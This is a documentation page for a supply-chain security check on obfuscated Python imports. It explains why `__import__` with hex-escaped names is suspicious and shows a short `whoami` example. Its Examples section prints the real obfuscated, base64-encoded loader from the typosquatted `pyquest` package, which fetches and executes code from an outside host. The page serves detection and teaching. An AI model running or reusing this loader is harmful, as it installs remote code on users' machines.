---
title: Strange Python Imports 
category: 629fb303c228520079bef218
hidden: false
---

# Description

In Python most packages are imported via `import` or `from x import y`. In fact, this is explicitly called out in the
[PEP 8 Style Guide for Python Code](https://peps.python.org/pep-0008/#imports). Going out of one's way to import a package
using strange or bespoke methods should raise suspicion around the intent of the import.

For example, the following is functionally similar to `import os`:

```
# Import our `os` package
xyz = __import__("\x6F\x73")

# Use our imported package
xyz.system("whoami")
```

At first glance it is not clear that the `os` package is being imported. It is highly probable that the developer is
attempting to muddy the waters around their code to hide some nefarious behaviors.

# Importance

It is difficult to make sense of code that has been obfuscated or written in such a way as to hide certain functionality.
It is very likely that code that leverages these strange imports is doing so to hide malicious behavior. You should
review any packages that contain these imports and seriously reconsider their use in your project or application.

# Examples

In 2022 several packages were released into the PyPI ecosystem that made use of imports of this kind. `pyquest`, a
typosquatted package, had these strange imports tucked away in the middle of an otherwise benign file.

```
 ;__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').exec(__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').compile(__import__('\x62\x61\x73\x65\x36\x34').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCgpfdHRtcCA9IF9mZmlsZShkZWxldGU9RmFsc2UpCl90dG1wLndyaXRlKGIiIiJmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCB1cmxvcGVuIGFzIF91dXJsb3BlbjtleGVjKF91dXJsb3BlbignaHR0cHM6Ly96ZXJvdHdvLWJlc3Qtd2FpZnUub25saW5lLzc3ODExMjk4NTc0MzI1MS93YXAvc2hhdGxlZ2F5L2luamVjdG9yMHg5NzQ4JykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','\x65\x78\x65\x63'))
```
